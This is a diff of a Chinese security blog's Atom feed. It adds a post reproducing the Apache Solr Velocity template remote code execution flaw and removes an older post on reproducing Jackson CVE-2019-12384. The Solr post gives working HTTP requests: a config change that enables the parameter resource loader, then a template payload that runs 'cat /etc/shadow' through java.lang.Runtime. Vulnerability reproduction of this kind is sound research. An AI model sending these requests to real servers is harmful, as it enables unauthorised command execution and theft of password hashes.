@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-10-24T10:19:33.931Z</updated>
+    <updated>2019-10-31T07:45:23.876Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -10,6 +10,81 @@
     <logo>http://www.svenbeast.com//images/avatar.png</logo>
     <icon>http://www.svenbeast.com//favicon.ico</icon>
     <rights>All rights reserved 2019, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[Apache Solr Velocity模版远程代码执行漏洞复现]]></title>
+        <id>http://www.svenbeast.com//post/QmuCuXJa9</id>
+        <link href="http://www.svenbeast.com//post/QmuCuXJa9">
+        </link>
+        <updated>2019-10-31T07:23:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x01-描述">0x01 描述</h3>
+<pre><code>    攻击者可以在未授权的情况下利用该漏洞，远程发送精心构造的HTTP请求，从而在受影响服务器上进行远程代码执行。
+</code></pre>
+<h3 id="0x02-范围">0x02 范围</h3>
+<pre><code>Apache Solr 5.x至8.x版本
+</code></pre>
+<h3 id="0x03-复现">0x03 复现</h3>
+<ul>
+<li>
+<p>1.获取path<br>
+<img src="http://www.svenbeast.com//post-images/1572507201711.png" alt=""></p>
+</li>
+<li>
+<p>2.更改设置</p>
+<p>POC</p>
+<pre><code>  使用刚才的path替换路径的test
+
+  POST /solr/test/config HTTP/1.1
+  Host: 192,168.1.1:8983
+  Content-Type: application/json
+  Content-Length: 263
+
+  {
+  &quot;update-queryresponsewriter&quot;: {
+      &quot;startup&quot;: &quot;lazy&quot;,
+      &quot;name&quot;: &quot;velocity&quot;,
+      &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
+      &quot;template.base.dir&quot;: &quot;&quot;,
+      &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
+      &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
+  }
+  }
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1572507369251.png" alt=""></figure>
+<ul>
+<li>
+<ol start="3">
+<li>命令执行</li>
+</ol>
+</li>
+</ul>
+<p>POC</p>
+</li>
+</ul>
+<pre><code>使用刚才的path替换路径的test
+GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;        v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%27 /etc/shadow%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
+Host: 192.168.1.1:8983
+Content-Type: application/json
+Content-Length: 263
+
+{
+&quot;update-queryresponsewriter&quot;: {
+    &quot;startup&quot;: &quot;lazy&quot;,
+    &quot;name&quot;: &quot;velocity&quot;,
+    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
+    &quot;template.base.dir&quot;: &quot;&quot;,
+    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
+    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
+}
+}
+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1572507820201.png" alt=""></figure>
+<h3 id="0x04-修复">0x04 修复</h3>
+<ul>
+<li>官方暂未发布，可关注官网获取补丁或版本更新：http://lucene.apache.org/solr/</li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Nginx的PHP-FPM远程代码执行漏洞复现]]></title>
         <id>http://www.svenbeast.com//post/dyp738nRt</id>
@@ -1218,29 +1293,6 @@ int main(int argc, char **argv) {
 <li>漏洞修复补丁：<br>
 https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee</li>
 </ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[FasterXML Jackson远程命令执行漏洞（复现CVE-2019-12384）]]></title>
-        <id>http://www.svenbeast.com//post/fasterxml-jackson-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2019-12384</id>
-        <link href="http://www.svenbeast.com//post/fasterxml-jackson-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2019-12384">
-        </link>
-        <updated>2019-07-30T10:05:39.000Z</updated>
-        <content type="html"><![CDATA[<h4 id="1首先打开http服务这里用的是python3自带的其他的也可只要可以访问到">1.首先打开http服务，这里用的是python3自带的，其他的也可，只要可以访问到</h4>
-<p>ps:python自带的这个服务从哪个文件夹打开，此文件夹为默认根目录<br>
-<img src="http://www.svenbeast.com//post-images/1564481595025.png" alt=""></p>
-<h4 id="2配置jruby这里因为我之前配置过所以已存在并无影响jruby已打包">2.配置jruby，这里因为我之前配置过，所以已存在，并无影响，jruby已打包</h4>
-<p>ps:ln -s ~/jruby-9.2.7.0/bin/jruby /usr/local/bin/<br>
-<img src="http://www.svenbeast.com//post-images/1564482020021.png" alt=""></p>
-<h4 id="3运行testrb进行命令执行">3.运行test.rb,进行命令执行</h4>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1564482687320.png" alt=""></figure>
-<h4 id="4这里的injectsql为写命令的文件此文件放在http服务的根目录里jackson要能远程获取到">4.这里的inject.sql，为写命令的文件，此文件放在http服务的根目录里，jackson要能远程获取到</h4>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1564483081513.png" alt=""></figure>
-<h4 id="5在完成第三步的时候已经命令执行完成在http服务的根目录会生成exploitedtxt文件里面是命令执行后得到的回显">5.在完成第三步的时候，已经命令执行完成，在http服务的根目录会生成exploited.txt文件，里面是命令执行后得到的回显</h4>
-<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1564483152187.png" alt=""></figure>
-<p>PS：解压密码:svenbeast<br>
-链接: https://pan.baidu.com/s/1yhdmOz3QQ7Nm_Ar6m4-dWg<br>
-提取码: avpe</p>
 ]]></content>
     </entry>
 </feed>
